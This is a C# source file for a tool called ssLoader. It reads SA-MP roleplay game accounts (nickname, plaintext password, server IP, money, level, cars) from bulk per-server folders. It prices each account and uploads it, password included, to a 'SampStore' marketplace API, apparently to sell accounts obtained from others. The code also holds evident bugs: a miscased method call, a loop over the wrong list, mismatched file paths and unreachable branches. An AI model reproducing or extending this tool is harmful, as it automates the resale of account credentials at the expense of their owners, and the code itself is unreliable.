using ssLoader.Json;
using ssLoader.Json.CarPrice;
using ssLoader.SampStoreAPI;
using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using JsonSerializer = System.Text.Json.JsonSerializer;

namespace ssLoader.Arizona
{
    public class AccountSender
    {
        private string getCurrDir = Directory.GetCurrentDirectory();
        int successArizona = 0;
        int successAdvance = 0;
        int successSRP = 0;

        private int CountPrice(float money, int lvl, int startprice, int typeMoney, int typeLevel)
        {
            var moneyCount = (money / 1000000.0) * typeMoney;
            var levelCount = lvl * typeLevel;
            int result = startprice + levelCount + (int)moneyCount;
            return result;
        }

        private int CarPrice(string input, string type, int typeMoney, double coefficient)
        {
            string line;
            if (input == null) return 0;
            double carp = 0;
            var file = new StreamReader($@"{getCurrDir}\Config\Cars\{type}.txt");
            double result = 0;
            while ((line = file.ReadLine()) != null)
            {
                string[] words = line.Split(new char[] { ':' });
                string carname = words[0];
                string carprice = words[1];
                if (input.Contains(carname))
                {
                    carp += float.Parse(carprice);
                    result = ((carp / 1000000.0) * coefficient) * typeMoney;
                }

                
            }
            return (int)result;
        }

        public string MinifyLong(long value)
        {
            if (value >= 100000000000)
                return (value / 1000000000).ToString("#,0") + "ккк";
            if (value >= 10000000000)
                return (value / 1000000000D).ToString("0.#") + "ккк";
            if (value >= 100000000)
                return (value / 1000000).ToString("#.0") + "кк";
            if (value >= 10000000)
                return (value / 1000000D).ToString("0.#") + "кк";
            if (value >= 1000000)
                return (value / 1000D).ToString("0.#") + "к";
            if (value >= 100000)
                return (value / 1000).ToString("0.#") + "к";
            if (value >= 100000)
                return (value / 1000).ToString("0.#") + "к";
            if (value >= 10000)
                return (value / 1000D).ToString("0.#") + "к";
            if (value >= 0)
                return (value / 1).ToString("0.#") + "вирт";
            if (value >= 1000)
                return (value / 100D).ToString("0.#") + "к";
            return value.ToString("#.0");
        }

        private string carsInfiTitle(string str)
        {
            if (str == "Нет" || str == "нет" || str == null)
                return "";
            else 
                return $"[ Авто: {str.Replace("\n", " ").Replace("(Владелец)","").Replace("[Не припарковано]", "").Replace("\t", " ").Replace("загружается при входе", "").Replace("-","")}]";
        }

        public async Task SendToSS(string path)
        {
            try
            {
                #region создание экземпляров классов
                var getAccounts = new GetAccounts();
                var accountSender = new AddAccount();
               // var config = new Json.Config();
                //var priceLevel = new Level();
                //var priceStart = new StartPrice();
                #endregion

                #region Десериализация json файлов
                using FileStream api_key = File.OpenRead(@$"{getCurrDir}\Config\Config.json");
                var jsonConfig = await JsonSerializer.DeserializeAsync<Configurate>(api_key);

                using FileStream openStream = File.OpenRead(@$"{getCurrDir}\Config\Money.json");
                var moneyPrice = await JsonSerializer.DeserializeAsync<Money>(openStream);

                using FileStream levelPriceJson = File.OpenRead(@$"{getCurrDir}\Config\Levels.json");
                var levelPrice = await JsonSerializer.DeserializeAsync<Level>(levelPriceJson);

                using FileStream startPriceJson = File.OpenRead(@$"{getCurrDir}\Config\StartPrice.json");
                var startPrice = await JsonSerializer.DeserializeAsync<StartPrice>(startPriceJson);

                using FileStream carPriceJson = File.OpenRead(@$"{getCurrDir}\Config\Cars\Coefficient.json");
                var carPrice = await JsonSerializer.DeserializeAsync<Prices>(carPriceJson);
                #endregion
                #region ArizonaRP
                // var arizonaFormat = new ArizonaFormat();
                var brainburgGoods = getAccounts.CheckNameArizonaBrainburg(path);
                var main = new Main();
                foreach (var ARZ in brainburgGoods)
                {
                    if (File.Exists($@"{path}\Arizona RP\Brainburg\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Brainburg\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        /* var text1 = File.ReadAllText($@"C:\Users\Fesenko.AP\source\repos\BUTCHERS228\ssLoader\bin\Debug\net5.0-windows\Config\Config.json");
                         var result1 = JsonSerializer.Deserialize<Config>(text1);*/
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, 0.6);
                        
                            MessageBox.Show($"{result.nick} ник | {result.money} | цена акк {price + carpr} | лвл {result.lvl} | Кары {carpr} | {result.cars}  | вирт {minifyLong(result.money)}");
                        successArizona++;
                    }
                    else continue;
                }
               
                var ChandlerGoods = getAccounts.CheckNameArizonaChandler(path);
                foreach (var ARZ in ChandlerGoods)
                {
                    if(File.Exists($@"{path}\Arizona RP\Chandler\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Chandler\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Gilbert = getAccounts.CheckNameArizonaGilbert(path);
                foreach (var ARZ in Gilbert)
                {
                    if (File.Exists($@"{path}\Arizona RP\Gilbert\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Gilbert\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Glendale = getAccounts.CheckNameArizonaGlendale(path);
                foreach (var ARZ in Glendale)
                {
                    if (File.Exists($@"{path}\Arizona RP\Glendale\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Glendale\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Kingman = getAccounts.CheckNameArizonaKingman(path);
                foreach (var ARZ in Kingman)
                {
                    if (File.Exists($@"{path}\Arizona RP\Kingman\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Kingman\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Mesa = getAccounts.CheckNameArizonaMesa(path);
                foreach (var ARZ in Mesa)
                {
                    if (File.Exists($@"{path}\Arizona RP\Mesa\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Mesa\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Payson = getAccounts.CheckNameArizonaPayson(path);
                foreach (var ARZ in Payson)
                {
                    if (File.Exists($@"{path}\Arizona RP\Payson\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Payson\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Phoenix = getAccounts.CheckNameArizonaPhoenix(path);
                foreach (var ARZ in Phoenix)
                {
                    if (File.Exists($@"{path}\Arizona RP\Phoenix\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Phoenix\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Prescott = getAccounts.CheckNameArizonaPrescott(path);
                foreach (var ARZ in Prescott)
                {
                    if (File.Exists($@"{path}\Arizona RP\Prescott\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Prescott\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var RedRock = getAccounts.CheckNameArizonaRedRock(path);
                foreach (var ARZ in RedRock)
                {
                    if (File.Exists($@"{path}\Arizona RP\Red Rock\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Red Rock\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var SaintRose = getAccounts.CheckNameArizonaSaintRose(path);
                foreach (var ARZ in SaintRose)
                {
                    if (File.Exists($@"{path}\Arizona RP\Saint Rose\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Saint Rose\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Scottdale = getAccounts.CheckNameArizonaScottdale(path);
                foreach (var ARZ in Scottdale)
                {
                    if (File.Exists($@"{path}\Arizona RP\Scottdale\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Scottdale\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Surprise = getAccounts.CheckNameArizonaSurprise(path);
                foreach (var ARZ in Surprise)
                {
                    if (File.Exists($@"{path}\Arizona RP\Surprise\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Surprise\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Tucson = getAccounts.CheckNameArizonaTucson(path);
                foreach (var ARZ in Tucson)
                {
                    if (File.Exists($@"{path}\Arizona RP\Tucson\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Tucson\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Winslow = getAccounts.CheckNameArizonaWinslow(path);
                foreach (var ARZ in Winslow)
                {
                    if (File.Exists($@"{path}\Arizona RP\Winslow\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Winslow\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                var Yuma = getAccounts.CheckNameArizonaYuma(path);
                foreach (var ARZ in Yuma)
                {
                    if (File.Exists($@"{path}\Arizona RP\Yuma\goods\{ARZ}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Arizona RP\Yuma\goods\{ARZ}.json");
                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.ArizonaRP, carPrice.ArizonaRP);
                        int summMoney = price + carpr;
                       await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successArizona++;
                    }
                    else continue;
                }
                #endregion
                #region AdvanceRP
                var advanceBlueGoods = getAccounts.CheckNameAdvanceBlue(path);
                foreach (var ARP in advanceBlueGoods)
                {
                    if (File.Exists($@"{path}\Advance RP\Blue\goods\{ARP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Advance RP\Blue\goods\{ARP}.json");
                        var result = JsonSerializer.Deserialize<AdvanceFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.AdvanceRP, moneyPrice.AdvanceRP, levelPrice.AdvanceRP);
                        int carpr = CarPrice(result.cars, "Advance", moneyPrice.AdvanceRP, carPrice.AdvanceRP);
                        int summMoney = price + carpr;
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successAdvance++;
                    }
                    else continue;
                }
                var advanceRedRed = getAccounts.CheckNameAdvanceRed(path);
                foreach (var ARP in advanceRedRed)
                {

                    if (File.Exists($@"{path}\Advance RP\Red\goods\{ARP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Advance RP\Red\goods\{ARP}.json");
                        var result = JsonSerializer.Deserialize<AdvanceFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.AdvanceRP, moneyPrice.AdvanceRP, levelPrice.AdvanceRP);
                        int carpr = CarPrice(result.cars, "ARZ", moneyPrice.AdvanceRP, carPrice.AdvanceRP);
                        int summMoney = price + carpr;
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successAdvance++;
                    }
                    else break;
                }
                var advanceLimeGoods = getAccounts.CheckNameAdvanceLime(path);
                foreach (var ARP in advanceLimeGoods)
                {
                    if (File.Exists($@"{path}\Advance RP\Lime\goods\{ARP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Advance RP\Lime\goods\{ARP}.json");
                        var result = JsonSerializer.Deserialize<AdvanceFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.AdvanceRP, moneyPrice.AdvanceRP, levelPrice.AdvanceRP);
                        int carpr = CarPrice(result.cars, "ARP", moneyPrice.AdvanceRP, carPrice.AdvanceRP);
                        int summMoney = price + carpr;
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successAdvance++;
                    }
                    else continue;
                }
                var advanceLimeGreen = getAccounts.CheckNameAdvanceGreen(path);
                foreach (var ARP in advanceLimeGreen)
                {
                    if (File.Exists($@"{path}\Advance RP\Green\goods\{ARP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Advance RP\Green\goods\{ARP}.json");
                        var result = JsonSerializer.Deserialize<AdvanceFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.AdvanceRP, moneyPrice.AdvanceRP, levelPrice.AdvanceRP);
                        int carpr = CarPrice(result.cars, "ARP", moneyPrice.AdvanceRP, carPrice.AdvanceRP);
                        int summMoney = price + carpr;
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, summMoney, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках {carsInfiTitle(result.cars)}"));
                        successAdvance++;
                    }
                    else continue;
                }
                #endregion
                #region SampRp
                var srpRevo = getAccounts.CheckNameSrpRevolution(path);
                foreach (var SRP in srpRevo)
                {
                    if (File.Exists($@"{path}\Samp RP\Revolution\goods\{SRP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Samp RP\Revolution\goods\goods\{SRP}.json");
                        var result = JsonSerializer.Deserialize<SampRPFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.SampRP, moneyPrice.SampRP, levelPrice.SampRP);
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, price, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках"));
                        successSRP++;
                    }
                    else continue;
                }
                var srp02 = getAccounts.CheckNameSrpZerotwo(path);
                foreach (var SRP in srp02)
                {
                    if (File.Exists($@"{path}\Samp RP\02\goods\{SRP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Samp RP\02\goods\goods\{SRP}.json");
                        var result = JsonSerializer.Deserialize<SampRPFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.SampRP, moneyPrice.SampRP, levelPrice.SampRP);
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, price, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках"));
                        successSRP++;
                    }
                    else continue;
                }
                var Legacy = getAccounts.CheckNameSrplegacytwo(path);
                foreach (var SRP in Legacy)
                {
                    if (File.Exists($@"{path}\Samp RP\Legacy\goods\goods\{SRP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Samp RP\Legacy\goods\goods\{SRP}.json");
                        var result = JsonSerializer.Deserialize<SampRPFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.SampRP, moneyPrice.SampRP, levelPrice.SampRP);
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, price, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках"));
                        successSRP++;
                    }
                    else continue;
                }
                var Classic = getAccounts.CheckNameSrpClassic(path);
                foreach (var SRP in Legacy)
                {
                    if (File.Exists($@"{path}\Samp RP\Classic\goods\goods\{SRP}.json"))
                    {
                        var text = File.ReadAllText($@"{path}\Samp RP\Classic\goods\goods\{SRP}.json");
                        var result = JsonSerializer.Deserialize<SampRPFormat>(text.Replace("\r\n", ""));
                        int price = CountPrice(result.money, result.lvl, startPrice.SampRP, moneyPrice.SampRP, levelPrice.SampRP);
                        await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, price, null, result.nick, result.password, "", jsonConfig.seller_message, $" {result.lvl} уровень | {MinifyLong(result.money)} на руках"));
                        successSRP++;
                    }
                    else continue;
                }
                #endregion
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }
            finally
            {
                MessageBox.Show($"Обработано: \nArizona RP{successArizona}\nAdvance RP {successAdvance}\nSamp-RP\n{successSRP}", "Обработка завершена");
            }
        }
    }
}
